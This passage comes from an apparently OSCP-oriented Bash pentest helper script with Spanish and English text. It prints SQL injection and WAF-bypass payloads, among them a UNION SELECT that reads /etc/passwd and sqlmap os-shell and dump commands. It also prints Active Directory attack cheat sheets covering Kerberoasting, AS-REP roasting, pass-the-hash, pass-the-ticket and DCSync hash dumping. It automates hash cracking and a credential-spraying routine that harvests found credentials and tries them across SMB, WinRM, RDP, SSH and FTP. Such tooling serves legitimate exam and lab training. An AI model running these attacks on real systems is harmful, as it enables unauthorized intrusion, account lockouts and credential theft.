    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' UNION SELECT 1,pg_read_file('/etc/passwd'),3,4-- -${NC}"
    echo ""

    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- WAF BYPASS (trucos comunes) ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/**/UNION/**/SELECT${NC}                    ${DIM}-> spaces con comentarios${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}UniOn SeLeCt${NC}                            ${DIM}-> alternating case${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}%55NION %53ELECT${NC}                        ${DIM}-> URL encoding parcial${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' || '1'='1${NC}                             ${DIM}-> concatenacion en vez de OR${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}0x61646d696e${NC}                            ${DIM}-> hex en vez de 'admin'${NC}"
    echo ""

    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- SQLMAP (automatizar si estas atascado) ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}GET:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}sqlmap -u 'http://target/page?id=1' --batch --dbs${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}POST:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}sqlmap -u 'http://target/login' --data='user=a&pass=b' --batch --dbs${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Con cookie:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}sqlmap -u 'http://target/page?id=1' --cookie='PHPSESSID=abc123' --batch --dbs${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Dump todo:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}sqlmap -u 'http://target/page?id=1' --batch -D dbname --dump${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}OS shell (si tiene permisos de escritura):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}sqlmap -u 'http://target/page?id=1' --os-shell${NC}"
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
}

# =============================================================================
# -- [AD] Active Directory Cheatsheet -----------------------------------------
# =============================================================================
ad_cheatsheet() {
    banner
    log_section "ACTIVE DIRECTORY — OSCP Cheatsheet"

    local target_ip="${IP:-TARGET_IP}"
    local target_domain="${DOMAIN:-TARGET.LOCAL}"
    local target_user="${USER_CRED:-USER}"
    local target_pass="${PASS_CRED:-PASSWORD}"

    echo ""
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${BOLD}🏢 ACTIVE DIRECTORY -> Ataques OSCP${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}Target: ${target_ip}   Domain: ${target_domain}   User: ${target_user}${NC}"
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"

    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 0. SIDs - GUIA RAPIDA ---${NC}"
    echo ""
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Que es un SID?${NC} Identificador unico de cada usuario/grupo en Windows/AD."
    echo -e "  ${LPURPLE}|${NC}  ${DIM}Estructura:  S-1-5-21-[DOMINIO]-[RID]${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}Ejemplo:     S-1-5-21-3623811015-3361044348-30300820-1013${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}             +------------ SID del Dominio ----------+ + RID${NC}"
    echo ""
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}RIDs criticos que debes conocer:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}-500${NC}   Administrator          ${DIM}-> siempre existe, target #1${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}-501${NC}   Guest"
    echo -e "  ${LPURPLE}|${NC}  ${LRED}-502${NC}   ${BOLD}krbtgt${NC}                 ${DIM}-> su hash NTLM = GOLDEN TICKET${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}-512${NC}   Domain Admins           ${DIM}-> el grupo que quieres alcanzar${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}-513${NC}   Domain Users            ${DIM}-> todos los usuarios del dominio${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}-516${NC}   Domain Controllers"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}-519${NC}   Enterprise Admins       ${DIM}-> maximo privilegio en el bosque${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}-1000+${NC} Usuarios/Grupos creados ${DIM}-> cuentas de servicio, empleados${NC}"
    echo ""
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Obtener SIDs -> Desde Windows (victima):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}whoami /user${NC}                            ${DIM}-> tu SID actual${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}wmic useraccount get name,sid${NC}            ${DIM}-> todos los SIDs locales${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}Get-ADUser -Filter * -Prop SID | select Name,SID${NC}  ${DIM}-> PowerShell AD${NC}"
    echo ""
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Obtener SIDs -> Desde Kali (atacante):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}impacket-lookupsid ${target_domain}/${target_user}:${target_pass}@${target_ip}${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}  -> Brute-force de RIDs: enumera usuarios, grupos y sus SIDs${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}rpcclient -U '${target_user}%${target_pass}' ${target_ip} -c 'lookupnames Administrator'${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}rpcclient -U '${target_user}%${target_pass}' ${target_ip} -c 'lsaenumsid'${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}$NXC smb ${target_ip} -u ${target_user} -p ${target_pass} --rid-brute${NC}"
    echo ""
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Para que necesitas el SID en el examen?${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}-> Golden Ticket:  SID del dominio + hash NTLM de krbtgt${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}-> Silver Ticket:  SID del dominio + hash de cuenta de servicio${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}-> SID History:    inyectar SID-512 (DA) en usuario controlado${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}-> RID Cycling:    enumerar usuarios validos sin creds (anonimo)${NC}"
    echo ""
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"

    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 1. ENUMERACION / COLECCION ---${NC}"
    echo ""
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}BloodHound (Python -> sin agente en el target):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}bloodhound-python -c All -d ${target_domain} -ns ${target_ip} -u ${target_user} -p ${target_pass}${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}-> Abre BloodHound GUI -> Neo4j -> Upload los JSON generados${NC}"
    echo ""
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}LDAP -> Usuarios sin autenticacion:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}ldapsearch -x -H ldap://${target_ip} -b 'DC=${target_domain/./,DC=}' '(objectClass=user)' sAMAccountName${NC}"
    echo ""
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}RPC -> Usuarios del dominio:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}rpcclient -U \"\" -N ${target_ip} -c 'enumdomusers'${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}rpcclient -U \"${target_user}%${target_pass}\" ${target_ip} -c 'enumdomusers'${NC}"
    echo ""
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}$CME -> Enumerar shares y usuarios:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}$NXC smb ${target_ip} -u ${target_user} -p ${target_pass} --users${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}$NXC smb ${target_ip} -u ${target_user} -p ${target_pass} --shares${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}$NXC smb ${target_ip} -u ${target_user} -p ${target_pass} --groups${NC}"

    echo ""
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 2. KERBEROASTING (SPN -> TGS -> Hash) ---${NC}"
    echo ""
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 1 -> Pedir tickets para cuentas con SPN:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}impacket-GetUserSPNs ${target_domain}/${target_user}:${target_pass} -dc-ip ${target_ip} -request -outputfile kerberoast.txt${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 2 -> Crackear:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt${NC}"

    echo ""
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 3. AS-REP ROASTING (No preauth -> Hash) ---${NC}"
    echo ""
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Sin credenciales (usuarios anonimos vulnerables):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}impacket-GetNPUsers ${target_domain}/ -dc-ip ${target_ip} -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Con credenciales:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}impacket-GetNPUsers ${target_domain}/${target_user}:${target_pass} -dc-ip ${target_ip} -request -format hashcat -outputfile asrep.txt${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 2 -> Crackear:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt${NC}"

    echo ""
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 4. PASS-THE-HASH (PTH) ---${NC}"
    echo ""
    echo -e "  ${LPURPLE}|${NC}  ${DIM}-> Necesitas el hash NTLM de la cuenta (de secretsdump / mimikatz)${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}evil-winrm:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}evil-winrm -i ${target_ip} -u ${target_user} -H NTLM_HASH${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}PsExec:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}impacket-psexec ${target_domain}/${target_user}@${target_ip} -hashes :NTLM_HASH${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}$CME:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}$NXC smb ${target_ip} -u ${target_user} -H NTLM_HASH --local-auth${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}$CME winrm ${target_ip} -u ${target_user} -H NTLM_HASH${NC}"

    echo ""
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 5. PASS-THE-TICKET (PTT) ---${NC}"
    echo ""
    echo -e "  ${LPURPLE}|${NC}  ${DIM}-> Necesitas un ticket Kerberos (.ccache) de la victima${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 1 -> Exportar el ticket:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}export KRB5CCNAME=/ruta/al/ticket.ccache${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 2 -> Usar con impacket (flag -k -no-pass):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}impacket-psexec ${target_domain}/${target_user}@${target_ip} -k -no-pass${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}impacket-wmiexec ${target_domain}/${target_user}@${target_ip} -k -no-pass${NC}"

    echo ""
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 6. DUMP DE HASHES (DC comprometido) ---${NC}"
    echo ""
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Secretsdump remoto (cuando tienes admin):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}impacket-secretsdump ${target_domain}/${target_user}:${target_pass}@${target_ip}${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}DCSync (solo usuario con permisos de replicacion):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}impacket-secretsdump ${target_domain}/${target_user}:${target_pass}@${target_ip} -just-dc-user Administrator${NC}"

    echo ""
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 7. BLOODHOUND -> Queries utiles (GUI) ---${NC}"
    echo ""
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paths criticos a buscar en la GUI de BloodHound:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}Shortest Paths to Domain Admins${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}Find all Domain Admins${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}Find Principals with DCSync Rights${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}Find AS-REP Roastable Users (DontReqPreAuth)${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}Find Kerberoastable Users${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}Shortest Path from Owned Principals${NC}  ${DIM}-> Marcar usuarios ya comprometidos${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Arrancar Neo4j + BloodHound:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}sudo neo4j start${NC}  ->  luego abre BloodHound GUI y conecta a bolt://localhost:7687"
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"

    echo ""; read -rp "  Presiona ENTER para continuar..."
}

# =============================================================================
# -- [Q] Quick Notes ----------------------------------------------------------
# =============================================================================
quick_notes() {
    banner
    log_section "QUICK NOTES"
    require_loot || return

    local notes_file="$LOOT_DIR/notes.md"
    if [[ ! -f "$notes_file" ]]; then
        cat > "$notes_file" <<NOTESEOF
# Notas de Enumeración
## Target: ${IP:-desconocido}
## Fecha: $(date '+%Y-%m-%d %H:%M')
---
## Hallazgos Clave


## Vectores de Ataque


## Credenciales


## Flags
- user.txt: 
- proof.txt: 

## Notas
NOTESEOF
        log_ok "Notas creadas: $notes_file"
    fi

    local editor=""
    for e in nano vim vi; do
        command -v "$e" &>/dev/null && { editor="$e"; break; }
    done
    if [[ -n "$editor" ]]; then
        log_info "Abriendo con $editor..."
        "$editor" "$notes_file"
    else
        log_error "Sin editor. Archivo: $notes_file"
    fi
}

# =============================================================================
# -- Parse service versions from nmap output ----------------------------------
# =============================================================================
parse_service_versions() {
    local nmap_file="$1"
    [[ ! -f "$nmap_file" ]] && return

    SERVICES_VERSION=()
    while IFS= read -r line; do
        local port svc ver
        port=$(echo "$line" | grep -oP '^\d+')
        svc=$(echo "$line" | awk '{print $3}')
        ver=$(echo "$line" | sed 's/^[[:space:]]*//' | awk '{for(i=4;i<=NF;i++) printf "%s ", $i}' | sed 's/[[:space:]]*$//' | head -c 40)
        [[ -n "$port" && -n "$svc" ]] && SERVICES_VERSION+=("${port}:${svc}:${ver}")
    done < <(grep -P '^\d+/tcp\s+open' "$nmap_file" 2>/dev/null)

    # Also extract domains/hostnames from nmap
    local found_domains
    found_domains=$(grep -oP '(?:DNS:|commonName=|Subject:.*CN=)\K[\w.-]+\.\w+' "$nmap_file" 2>/dev/null | sort -u)
    if [[ -n "$found_domains" ]]; then
        while IFS= read -r d; do
            local already=false
            for existing in "${DOMAINS_FOUND[@]}"; do
                [[ "$existing" == "$d" ]] && already=true
            done
            if ! $already; then
                DOMAINS_FOUND+=("$d")
                add_finding "🌐 Dominio encontrado: $d"
            fi
        done <<< "$found_domains"
    fi
}

# =============================================================================
# -- 12. Remote Access (RDP & WinRM) ------------------------------------------
# =============================================================================
remote_access_enum() {
    require_ip   || return
    require_loot || return
    banner
    log_section "REMOTE ACCESS (AUTO)"

    if has_port 3389; then
        run_cmd "RDP Nmap" "nmap -p3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 $IP -oN $LOOT_DIR/scans/rdp_nmap.txt" ""
    fi
    
    if has_any_port 5985 5986; then
        log_info "WinRM is accessible. Use CME or evil-winrm when credentials are found."
    fi
}

# =============================================================================
db_enum() {
    require_ip   || return
    require_loot || return
    banner
    log_section "DATABASE SERVICES (AUTO)"

    if has_port 1433; then
        run_cmd "MSSQL nmap" "nmap -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-dump-hashes,ms-sql-ntlm-info -Pn $IP -oN $LOOT_DIR/db/mssql.txt" ""
    fi

    if has_port 3306; then
        run_cmd "MySQL nmap" "nmap -p3306 --script mysql-empty-password,mysql-info,mysql-enum,mysql-databases,mysql-variables -Pn $IP -oN $LOOT_DIR/db/mysql.txt" ""
    fi

    if has_port 5432; then
        run_cmd "PostgreSQL scripts" "nmap -p5432 --script pgsql-brute,pgsql-databases -Pn $IP -oN $LOOT_DIR/db/pgsql.txt" ""
    fi

}
# =============================================================================
# -- Hash Cracking Helper -----------------------------------------------------
# =============================================================================
hash_cracking_helper() {
    require_loot || return
    banner
    log_section "HASH CRACKING HELPER"

    # Find hash files
    local hash_files=()
    while IFS= read -r f; do
        hash_files+=("$f")
    done < <(find "$LOOT_DIR" -name "*hash*" -o -name "*asrep*" -o -name "*kerberoast*" -o -name "*hydra*" 2>/dev/null | sort)

    if [[ ${#hash_files[@]} -gt 0 ]]; then
        echo -e "  ${LGREEN}${BOLD}Hash files encontrados:${NC}"
        local i=1
        for f in "${hash_files[@]}"; do
            local lines; lines=$(wc -l < "$f" 2>/dev/null || echo 0)
            echo -e "  ${WHITE}[$i]${NC} $f ${DIM}($lines lines)${NC}"
            ((i++))
        done
        echo ""
    else
        log_info "No se encontraron archivos de hashes en $LOOT_DIR"
    fi

    echo -e "  ${LCYAN}${BOLD}--- HASH TYPE REFERENCE ---${NC}"
    echo ""
    echo -e "  ${WHITE}Hashcat Mode  │ Tipo                    │ Ejemplo${NC}"
    echo -e "  ------------+-------------------------+--------------------"
    echo -e "  ${CYAN}0${NC}             │ MD5                     │ 5f4dcc3b5aa765d..."
    echo -e "  ${CYAN}100${NC}           │ SHA1                    │ 5baa61e4c9b93f3..."
    echo -e "  ${CYAN}400${NC}           │ WordPress (phpass)      │ \$P\$B..."
    echo -e "  ${CYAN}500${NC}           │ MD5crypt                │ \$1\$..."
    echo -e "  ${CYAN}1000${NC}          │ NTLM                    │ aad3b435b51404e..."
    echo -e "  ${CYAN}1800${NC}          │ sha512crypt (Linux)     │ \$6\$..."
    echo -e "  ${CYAN}3200${NC}          │ bcrypt                  │ \$2a\$..."
    echo -e "  ${CYAN}5600${NC}          │ NetNTLMv2               │ user::domain:..."
    echo -e "  ${CYAN}13100${NC}         │ Kerberoast (TGS)        │ \$krb5tgs\$..."
    echo -e "  ${CYAN}18200${NC}         │ AS-REP Roast            │ \$krb5asrep\$..."
    echo ""
    echo -e "  ${LCYAN}${BOLD}--- QUICK COMMANDS ---${NC}"
    echo ""
    echo -e "  ${WHITE}Hashcat:${NC}"
    echo -e "  ${YELLOW}hashcat -m <MODE> hashes.txt /usr/share/wordlists/rockyou.txt${NC}"
    echo -e "  ${YELLOW}hashcat -m <MODE> hashes.txt $WORDLIST_PASS --rules-file /usr/share/hashcat/rules/best64.rule${NC}"
    echo ""
    echo -e "  ${WHITE}John:${NC}"
    echo -e "  ${YELLOW}john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt${NC}"
    echo -e "  ${YELLOW}john --show hashes.txt${NC}  ← ver resultados crackeados"
    echo ""

    if [[ ${#hash_files[@]} -gt 0 ]]; then
        read -rp "  $(echo -e "${CYAN}Selecciona archivo para crackear (nº) o ENTER para salir:${NC} ")" sel
        if [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= ${#hash_files[@]} )); then
            local target="${hash_files[$((sel-1))]}"
            read -rp "  $(echo -e "${CYAN}Hashcat mode (-m):${NC} ")" mode
            if [[ -n "$mode" ]]; then
                read -rp "  Wordlist [default: $WORDLIST_PASS]: " wl
                wl="${wl:-$WORDLIST_PASS}"
                tmux_run "Hashcat" \
                    "hashcat -m $mode '$target' '$wl' --force 2>&1 | tee $LOOT_DIR/creds/hashcat_output.txt" \
                    "$LOOT_DIR/creds/hashcat_output.txt"
            fi
        fi
    fi
}
# =============================================================================
exploit_search() {
    require_loot || return
    banner
    log_section "EXPLOIT SEARCH"

    echo -e "  ${WHITE}[1]${NC} Searchsploit free search"
    echo -e "  ${WHITE}[2]${NC} Searchsploit against nmap XML output"
    echo -e "  ${WHITE}[3]${NC} Parse CVEs from vuln scan"
    echo -e "  ${WHITE}[4]${NC} Critical checks: EternalBlue / PrintNightmare / ZeroLogon"
    echo -e "  ${WHITE}[b]${NC} Back"
    echo ""
    read -rp "  Option: " choice

    case $choice in
        1)
            read -rp "  Search term: " search_term
            if [[ -z "$search_term" ]]; then
                log_warn "Búsqueda vacía — introduce un término (ej: 'Apache 2.2', 'OpenSSH 5.9')."
                echo ""; read -rp "  Press ENTER to continue..."; return
            fi
            run_cmd "Searchsploit" "searchsploit '$search_term'" ""
            echo ""
            read -rp "  Copy an exploit? (EDB-ID number or empty to skip): " edb_id
            if [[ -n "$edb_id" ]]; then
                searchsploit -m "$edb_id"
                mv ./*.py ./*.c ./*.rb ./*.sh 2>/dev/null "$LOOT_DIR/exploit/" 2>/dev/null
            fi
            ;;
        2)
            if [[ ! -f "$LOOT_DIR/scans/targeted.xml" ]]; then
                log_error "No XML found. Run [3] Deep Service Scan first."
            else
                run_cmd "Searchsploit nmap XML" \
                    "searchsploit --nmap $LOOT_DIR/scans/targeted.xml 2>&1 | tee $LOOT_DIR/exploit/searchsploit_nmap.txt" ""
            fi
            ;;
        3)
            if [[ -f "$LOOT_DIR/scans/vulns.txt" ]]; then
                log_info "CVEs found in vuln scan:"
                grep -oP 'CVE-\d{4}-\d+' "$LOOT_DIR/scans/vulns.txt" | sort -u | tee "$LOOT_DIR/exploit/cves.txt"
                echo ""
                log_info "VULNERABLE entries:"
                grep -i "VULNERABLE" "$LOOT_DIR/scans/vulns.txt"
            else
                log_error "No vuln scan file found. Run [3] Vuln scan first."
            fi
            ;;
        4)
            run_cmd "MS17-010 EternalBlue" \
                "nmap -p445 --script smb-vuln-ms17-010 -Pn $IP -oN $LOOT_DIR/exploit/eternalblue.txt" \
                "$LOOT_DIR/exploit/eternalblue.txt"
            run_cmd "PrintNightmare CVE-2021-1675" \
                "nmap -p445 --script smb-vuln-cve-2021-1675 -Pn $IP -oN $LOOT_DIR/exploit/printnightmare.txt" \
                "$LOOT_DIR/exploit/printnightmare.txt"
            if [[ -n "$DOMAIN" && -n "$USER_CRED" ]]; then
                run_cmd "ZeroLogon check" \
                    "impacket-zerologon-check $IP 2>&1 | tee $LOOT_DIR/exploit/zerologon.txt" ""
            fi
            ;;
        b|B) return ;;
    esac

    echo ""; read -rp "  Press ENTER to continue..."
}

# =============================================================================
# -- UPGRADE 6: Universal Credential Validator / Reutilizaci?n de Claves ------
# =============================================================================
credential_reuse_checker() {
    require_ip || return
    require_loot || return
    banner
    log_section "UNIVERSAL CREDENTIAL VALIDATOR / REUTILIZACIÓN DE CLAVES"
    
    echo -e "  ${CYAN}Este módulo probará automáticamente las credenciales aportadas${NC}"
    echo -e "  ${CYAN}en TODOS los servicios compatibles detectados (SMB, WinRM, RDP, SSH, FTP).${NC}"
    echo -e "  ${DIM}NOTA: 100% legal OSCP. No auto-explota memoria, solo valida accesos.${NC}"
    echo ""
    echo -e "  ${WHITE}[1]${NC} Manual Mode (Input specific user/pass or path to lists)"
    echo -e "  ${WHITE}[2]${NC} AUTO-SPRAY (Harvests all found credentials & combines them)"
    echo ""
    read -rp "  Option: " c_opt
    
    local spray_user=""
    local spray_pass=""
    
    if [[ "$c_opt" == "2" ]]; then
        log_run "Harvesting users and passwords from local memory..."
        spray_user="$LOOT_DIR/creds/auto_users.txt"
        spray_pass="$LOOT_DIR/creds/auto_pass.txt"
        
        # Base accounts
        echo -e "admin\nadministrator\nroot\nguest" > "$spray_user"
        [[ -n "$DOMAIN" ]] && echo "$DOMAIN" | cut -d'.' -f1 >> "$spray_user"
        echo -e "password\n123456\n1234" > "$spray_pass"

        # Harvest from FINDINGS (format generally ends with user:password or user username)
        for f in "${FINDINGS[@]}"; do
            if [[ "$f" == *"CREDENCIAL"* || "$f" == *"ADMIN PWNED"* || "$f" == *"ACCESO VÁLIDO"* ]]; then
                # Intentar limpiar hasta el último delimitador de espacio o dos puntos donde está la pass
                local raw_cred=$(echo "$f" | sed -E 's/.*(CREDENCIAL|PWNED|VÁLIDO).*: //g' | sed 's/\x1B\[[0-9;]*[a-zA-Z]//g')
                local usr=$(echo "$raw_cred" | cut -d':' -f1 | tr -d ' ')
                local pwd=$(echo "$raw_cred" | cut -s -d':' -f2 | tr -d ' ')
                [[ -n "$usr" ]] && echo "$usr" >> "$spray_user"
                [[ -n "$pwd" ]] && echo "$pwd" >> "$spray_pass"
            fi
        done
        
        # Add all found users into the password list to test user:user
        cat "$spray_user" >> "$spray_pass"
        
        # If we have smtp_users, add them
        [[ -f "$LOOT_DIR/creds/users_smtp.txt" ]] && cat "$LOOT_DIR/creds/users_smtp.txt" >> "$spray_user"
        
        # Unique them
        sort -u "$spray_user" -o "$spray_user"
        sort -u "$spray_pass" -o "$spray_pass"
        
        log_ok "Generados ${WHITE}$(wc -l < "$spray_user")${NC} usuarios y ${WHITE}$(wc -l < "$spray_pass")${NC} passwords."
    else
        read -rp "  $(echo -e "${YELLOW}👤 Introduce Usuario (o ruta al diccionario):${NC} ")" spray_user
        read -rp "  $(echo -e "${YELLOW}🔑 Introduce Password (o ruta al diccionario):${NC} ")" spray_pass
        [[ -z "$spray_user" || -z "$spray_pass" ]] && { log_warn "Usuario/Password vacíos. Abortando."; return 1; }
    fi
    
    echo ""
    log_info "=================================================="
    log_info " PASSWORD POLICY CHECK"
    log_info "=================================================="
    local pol_file="$LOOT_DIR/smb/nxc_passpol.txt"
    if [[ ! -f "$pol_file" ]]; then
        log_run "Obteniendo politica de contraseÃ±as para evitar bloqueos..."
        $NXC smb $IP -u '' -p '' --pass-pol 2>/dev/null > "$pol_file"
    fi
    local threshold=""
    if [[ -f "$pol_file" ]]; then
        threshold=$(grep -ioP 'Account lockout threshold: \K\d+' "$pol_file" | head -1)
    fi
    
    if [[ -n "$threshold" && "$threshold" -gt 0 ]]; then
        echo -e "  ${LRED}${BLINK}[!] Â¡PELIGRO DE BLOQUEO (LOCKOUT DETECTADO)!${NC}"
        echo -e "  ${LRED}  El Dominio tiene una polÃ­tica de Account Lockout Threshold = $threshold fallos.${NC}"
        echo -e "  ${YELLOW}  Lanzar un spray masivo puede bloquear cuentas legÃ­timas y daÃ±ar el entorno.${NC}"
        read -rp "  (>) Â¿EstÃ¡s 100% seguro de que quieres continuar con el Spray? (s/N): " spray_confirm
        if [[ ! "$spray_confirm" =~ ^[SsYy] ]]; then
            log_warn "OperaciÃ³n de Auto-Spray ABORTADA por el usuario para proteger el AD."
            return 0
        fi
    else
        log_ok "PolÃ­tica de bloqueo evaluada: Presuntamente de Riesgo Cero (0 fallos o no detectada)."
    fi
    
    local spray_target
    read -rp "  $(echo -e "${YELLOW}🎯 Target IP o SubRed (Dejar vacío para usar la actual: $IP):${NC} ")" spray_target
    spray_target="${spray_target:-$IP}"
    
    local protos=""
    if [[ "$spray_target" != "$IP" ]]; then
        log_info "Spray de Red Transversal (Lateral Movement) seleccionado."
        read -rp "  $(echo -e "${YELLOW}🛠️ Protocolos a escanear (ej: smb winrm rdp ssh ftp) [Todos]:${NC} ")" input_protos
        protos="${input_protos:-smb winrm rdp ssh ftp}"
    else
        has_any_port 139 445 && protos+="smb "
        has_any_port 5985 5986 && protos+="winrm "
        has_port 3389 && protos+="rdp "
        has_port 22 && protos+="ssh "
        has_port 21 && protos+="ftp "
        log_info "Usando auto-detección de puertos para la máquina actual."
    fi
    
    local any_tested=false
    echo ""
    log_info "Iniciando ráfaga de validación cruzada... / Cross-protocol validation..."
    
    # SMB (445, 139)
    if [[ " $protos " =~ " smb " ]]; then
        any_tested=true
        log_run "Testeando SMB en $spray_target..."
        local smb_out="$LOOT_DIR/creds/spray_smb.txt"
        $NXC smb "$spray_target" -u "$spray_user" -p "$spray_pass" --continue-on-success < /dev/null | tee "$smb_out"
        if grep -qF 'Pwn3d!' "$smb_out" 2>/dev/null; then
            add_finding "${LGREEN}💥 [SMB] ADMIN PWNED:${NC} $spray_user:$spray_pass"
